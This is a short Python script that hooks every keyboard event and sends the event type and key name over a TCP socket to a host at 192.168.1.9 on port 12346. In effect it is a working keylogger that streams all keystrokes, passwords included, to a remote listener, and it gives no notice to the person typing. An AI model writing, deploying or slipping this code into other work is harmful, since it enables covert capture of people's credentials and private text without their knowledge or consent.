# Import socket module
import socket               
import keyboard

def sendKey (e):
	# Create a socket object
	s = socket.socket()         

	# Define the port on which you want to connect
	port = 12346   

	# connect to the server on local computer
	s.connect(('192.168.1.9', port))
	#line = e.name
	#if e.event_type == 'down':
	key = e.event_type+" "+e.name#+" "+e.scan_code+" "+e.time
	#	key = e.name
	#line = '+'.join(str(name) for name in keyboard._pressed_events)
	s.send(key.encode())

	#print(s.recv(1024))
	# close the connection
	#s.close()


keyboard.hook(sendKey)
keyboard.wait()